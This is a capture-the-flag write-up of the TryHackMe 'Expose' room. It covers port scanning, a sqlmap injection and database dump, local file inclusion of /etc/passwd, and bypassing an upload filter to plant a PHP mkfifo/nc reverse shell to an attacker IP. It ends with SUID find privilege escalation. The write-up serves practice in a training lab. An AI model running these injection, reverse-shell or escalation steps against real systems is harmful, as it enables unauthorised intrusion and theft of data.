---
title: "TryHackMe | Expose"
date: 2025-08-22 03:00:00 +0100
categories: [TryHackMe]
tags: [thm, ctf, writeup]
image:
  path: https://github.com/user-attachments/assets/6c2f9476-ee67-40e4-8f86-cdc842490bd0
---

# Reconnaissance

For initial reconnaissance, I used this nmap command to scan for open ports:  
`sudo nmap -sS -sV -p- 10.10.188.185`

<img width="834" height="337" alt="image" src="https://github.com/user-attachments/assets/e7c47fc6-abd8-4881-81ea-90585283d9d0" />

We can see that there is a web server on port 1337. Accessing the site at `http://10.10.188.185:1337` shows us a basic HTML page. To enumerate further, I ran ffuf:

<img width="822" height="514" alt="image" src="https://github.com/user-attachments/assets/92654a58-5a01-4d2d-9a50-f25aff6b7b45" />

We find two endpoints: `admin` and `admin_101`.

# SQLi and Database Dump

Visiting `/admin_101`, we see that the email field is already set. Looking at the page source shows that the request is sent via POST:

<img width="696" height="392" alt="image" src="https://github.com/user-attachments/assets/c5c89fe5-4180-4708-9410-5e59c104e04d" />

I intercepted the POST request and saved it to `reqsq.txt`, then tested it with sqlmap:

<img width="1245" height="499" alt="image" src="https://github.com/user-attachments/assets/734a5254-9cfa-4cf2-a593-43f68f64b736" />

After some time, sqlmap reported that the `email` parameter is vulnerable!

<img width="1219" height="425" alt="image" src="https://github.com/user-attachments/assets/9643ff07-2dc4-4bac-97bb-d7909afcb10f" />

From there, I dumped the database with:  
`sqlmap -r reqsq.txt --batch --level=5 --risk=3 --dump`

The dump revealed two tables: `user` and `config`.

<img width="704" height="144" alt="image" src="https://github.com/user-attachments/assets/7724c3f1-f551-4639-a416-206762dafd77" />

<img width="763" height="151" alt="image" src="https://github.com/user-attachments/assets/831d39a9-aa4b-40ea-b4a5-72250e4f1869" />

Using the password on `/admin_101`, we gain access to this webpage:

<img width="1270" height="708" alt="image" src="https://github.com/user-attachments/assets/2b9e9cab-c22b-4357-946f-5ba1d1d4121a" />

# LFI and RCE

When we try the first URL from the `config` table (with its corresponding password), we are met with this message:

<img width="1269" height="718" alt="image" src="https://github.com/user-attachments/assets/d1705557-9271-4d0a-ba67-a34ba665a7b0" />

Viewing the page source gives us a hint:

<img width="516" height="70" alt="image" src="https://github.com/user-attachments/assets/78533700-1263-4b8a-b012-6c20dfe390e2" />

So we try just that, we can test the parameter by adding `?file=<file_to_read>` to the URL, this will allows us to read files that we have permissions to read. So we test with a world readable file like `/etc/passwd`:

Full URL: `http://10.10.137.122:1337/file1010111/index.php?file=/etc/passwd`

<img width="1277" height="652" alt="image" src="https://github.com/user-attachments/assets/d1409757-31f2-44d6-a2d8-5338347a3d36" />

And we have an LFI!

Checking `/etc/passwd`, I looked for entries with `/home`. We find two: `zeamkish` and `ubuntu`.

Next, we move to the second URL from the config table: `/upload-cv00101011/index.php`. This page prompts us for the username starting with “z”. Entering `zeamkish` gets us in:

<img width="1279" height="712" alt="image" src="https://github.com/user-attachments/assets/7604c4bb-012c-4406-9a84-0a89931ac89b" />

Now we can upload files. Looking at the source code, we see client-side sanitization restricting uploads to `.png` or `.jpg` extensions.  

Double extensions didn’t work, but we can bypass the check using Burp Suite. Intercepting the request, I changed the filename to `shell.php`, kept the `Content-Type: image/png`, and inserted my reverse shell payload:

```php
<?php system("mkfifo /tmp/f; nc 10.21.239.111 666 < /tmp/f | /bin/sh > /tmp/f 2>&1"); ?>
```
After sending it, we get a message in the response saying:

`File uploaded successfully! Maybe look in source code to see the path.`

The source revealed the upload path: /upload_thm_1001.

<img width="1273" height="656" alt="image" src="https://github.com/user-attachments/assets/18192beb-1406-47f5-aae4-04f9141a6e24" />

With a listener set, visiting:
http://10.10.137.122:1337/upload-cv00101011/upload_thm_1001/shellbwip.php
gives us a shell!

<img width="547" height="137" alt="image" src="https://github.com/user-attachments/assets/47447e0e-7042-4aa7-9c62-cb02225dab58" />

# User flag

For the user flag, I checked the home directory /home/zeamkish. Inside, there was a .txt file containing his SSH credentials:

<img width="518" height="298" alt="image" src="https://github.com/user-attachments/assets/96675d86-66fd-49bc-83c5-8c5e665da381" />

Using SSH with those credentials gave me a proper shell as zeamkish, and I was able to grab the user flag from flag.txt.

# Root flag

For privilege escalation, I looked for SUID binaries with:
find / -type f -perm -04000 -ls 2>/dev/null

Among the list, I noticed the find binary.

With a simple search using [https://gtfobins.github.io](https://gtfobins.github.io/) , we can escalate to root using:

`./find . -exec /bin/sh -p \; -quit`

<img width="599" height="115" alt="image" src="https://github.com/user-attachments/assets/28386c16-b957-427b-89b1-3c6e8d309dd3" />

And just like that — root access obtained and the final flag captured
